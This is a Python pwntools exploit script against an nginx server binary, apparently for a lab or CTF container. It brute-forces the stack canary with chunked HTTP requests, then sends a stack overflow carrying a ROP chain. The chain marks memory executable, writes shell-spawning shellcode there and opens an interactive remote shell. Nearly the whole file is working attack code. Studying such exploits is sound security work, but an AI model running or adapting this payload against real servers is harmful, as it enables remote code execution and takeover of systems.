#! /usr/bin/env python3

from pwn import *
import os

elf = ELF("/usr/local/nginx/sbin/nginx")
context.binary = elf
context.log_level = "ERROR"
context.terminal = ['tmux', 'splitw', '-h']
gdb_args = '''
set follow-fork-mode child
b *ngx_http_read_discarded_request_body+223
c
'''



shellcode = pwnlib.shellcraft.amd64.linux.dupsh(sock='rdi')
shellcode = asm(shellcode) + b'\x00'*3
sh = []
for i in range(0, len(shellcode), 8):
    sect = sh.append(shellcode[i:i+8])
print(sh)

mov_prdi_rsi = 0x0000000000408bc8
call_rax = 0x0000000000402c3e
pop_rsi = 0x0000000000408204
weird_pop_rdx = 0x000000000041ff46
add_rax_rdx = 0x000000000040a428
m_rax_rcx = 0x000000000044d94e
maybe_pop_rdx = 0x000000000041b680
m_rax_rsi = 0x000000000042ead1
pop_rdi = 0x0000000000403f19
rwx_reg = 0x675000

rchain = p64(pop_rdi)
rchain += p64(rwx_reg)
rchain += p64(m_rax_rsi)
rchain += p64(maybe_pop_rdx)
rchain += p64(0xffffffffff2f13d0)
rchain += p64(m_rax_rcx)
rchain += p64(add_rax_rdx)
rchain += p64(weird_pop_rdx)
rchain += p64(0x7)
rchain += p64(weird_pop_rdx)
rchain += p64(0x7)
rchain += p64(pop_rsi)
rchain += p64(0x1000)
rchain += p64(call_rax)
rchain += p64(0)

for i in range(len(sh)):
    rchain += p64(pop_rdi)
    rchain += p64(rwx_reg)
    rchain += p64(pop_rsi)
    rchain += sh[i]
    rchain += p64(mov_prdi_rsi)
    rwx_reg += 8

rchain += p64(pop_rdi)
rchain += p64(3)
rchain += p64(0x675000)

def checker(data):
    payload = b"GET / HTTP/1.1\n Host: something.com\n Transfer-Encoding: chunked\n"
    payload += data
    p.send(payload)

# Brute Force Stack cookie

def brute_force():
    print("Brute Forcing the stack cookie")
    payload = b"A"*(5063)
    payload += b"\x00"
    canary = b""
    for x in range(8):
        for i in range(256):
            p = remote("172.17.0.2", 80)
            data = payload
            data += i.to_bytes(1, byteorder='big')

            request = b'GET / HTTP/1.1\r\n' + \
                      b'Host: example.com\r\n' + \
                      b'Transfer-Encoding: chunked\r\n' + \
                      b'\r\n' + \
                      data
            p.send(request)
            try:
                p.recv()
                print(f"BYTE {i} FOUND")
                canary += i.to_bytes(1, byteorder='big')
                payload += i.to_bytes(1, byteorder='big')
                p.close()
                break
            except:
                p.close()
                pass
    if len(canary) == 8:
        print("Canary found: ", canary)
    else:
        print("Canary brute force failed")
        exit()
    return canary

# EXPLOIT
def exploit(canary):
    r = process(["/usr/local/nginx/sbin/nginx", "-g", "daemon off;"])
    payload = b"A"*5063 + b"B"*96 + rchain
    p = remote("172.17.0.2", 80)
    #pid = os.system("ps auxf | grep 'nginx: worker process' | grep nobody > pid")
    #with open("pid", "r") as f:
    #    pid = int(f.readlines()[1].split()[1])-1
#    gdb.attach(pid, gdbscript=gdb_args)
    #print(pid)
    data=payload
    request = b'GET / HTTP/1.1\r\n' + \
              b'Host: example.com\r\n' + \
              b'Transfer-Encoding: chunked\r\n' + \
              b'\r\n' + \
              data

    p.send(request)
    sleep(0.1)
    p.sendline(b'echo "YOU HAVE BEEN PWNED"')
    p.interactive()
              
c = b""
exploit(c)

